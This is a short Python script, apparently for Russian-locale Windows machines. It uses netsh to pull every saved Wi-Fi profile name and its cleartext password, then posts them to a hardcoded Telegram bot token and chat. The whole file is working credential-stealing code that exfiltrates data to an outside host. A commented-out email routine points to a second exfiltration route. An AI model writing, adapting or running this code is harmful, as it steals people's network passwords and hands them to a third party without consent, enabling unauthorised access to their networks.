# import smtplib
# from email.mime.text import MIMEText
import subprocess
import requests


def extract_wifi_password():

    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split('\n')

    profiles = [i.split(':')[1].strip() for i in profiles_data if 'Все профили пользователей' in i]
    # print(profiles)
    message = ''
    for profile in profiles:
        profile_info = subprocess.check_output(f'netsh wlan show profile \"{profile}\" key = clear').decode('CP866').split('\n')
        # print(profile_info)
        try:
            password = [i.split(':')[1].strip() for i in profile_info if 'Содержимое ключа' in i]
            password = password[0]
        except IndexError:
            password = None

        message += f'Имя Wi-Fi сети: {profile}\nПароль : {password}\n\n'
    return message




def send_telegram(text: str):
    token = "5184570660:AAGA6bV4626LHf5KCxRLWFuxZdW_4yWGTNc"
    url = "https://api.telegram.org/bot"
    channel_id = "913481127"
    url += token
    method = url + "/sendMessage"

    r = requests.post(method, data={
         "chat_id": channel_id,
         "text": text
          })
    if r.status_code != 200:
        raise Exception("post_text error")

    if r.status_code != 200:
        raise Exception("post_text error")


def main():
    message = extract_wifi_password()
    # print(send_email(message=message))
    send_telegram(f'{message}')


if __name__ == '__main__':
    main()
